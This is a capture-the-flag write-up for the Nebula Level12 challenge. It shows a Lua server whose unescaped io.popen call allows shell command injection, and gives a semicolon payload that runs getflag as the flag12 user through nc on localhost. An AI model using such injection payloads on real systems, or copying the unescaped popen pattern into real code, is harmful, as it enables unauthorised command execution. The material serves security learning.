# Level12

> This one took me by surprise because it's so easy. Level11 is crazy hard in comparison, and I still haven't figured it out! Also it's been a good few months since I attempted these.

This task has a simple lua script which can be found in `vulnerable.lua`. It's a tiny little server which listens on `127.0.0.1:50001`, takes in a password, then pipes that password into `sha1sum`. If the SHA1 hash of the password is equivalent to `4754a4f4bd5787accd33de887b9250a0691dd198`, then you win! (But it doesn't actually do anything).

First we can run a command to check _who_ is running the server:

```bash
level12@nebula:/home/flag12$ ps -aef | grep flag12
flag12    1228     1  0 20:41 ?        00:00:00 /usr/bin/lua /home/flag12/flag12.lua
level12   2066  1890  0 21:13 pts/1    00:00:00 grep --color=auto flag12
```

That's good. `flag12` is running the server (as you'd expect), so if we inject a command into the lua program, we can run anything as `flag12`. 

The vulnerable part lies here:

```lua
prog = io.popen("echo "..password.." | sha1sum", "r")
```

It's using string concatenation of the _unescaped_ password as the argument to echo. We can simply use a semi-colon to terminate the echo command and then inject any command we like!

Here's the payload:

```bash
4754a4f4bd5787accd33de887b9250a0691dd198; getflag > /tmp/flag.txt; echo nothing
```

Following concatenation, this becomes:

```bash
echo 4754a4f4bd5787accd33de887b9250a0691dd198; getflag > /tmp/flag.txt; echo nothing | sha1sum
```

Which will: print the target hash to the lua program just for fun, run `getflag` and pipe the output to `/tmp/flag.txt`, then echo a useless string `nothing` to `sha1sum`. Now all we need to do is connect via `nc` and get the 'flag'!

```bash
level12@nebula:/home/flag12$ nc 127.0.0.1 50001
Password: 4754a4f4bd5787accd33de887b9250a0691dd198; getflag > /tmp/flag.txt; echo nothing  
Congrats, your token is 413**CARRIER LOST**
level12@nebula:/home/flag12$ cat /tmp/flag.txt 
You have successfully executed getflag on a target account
```

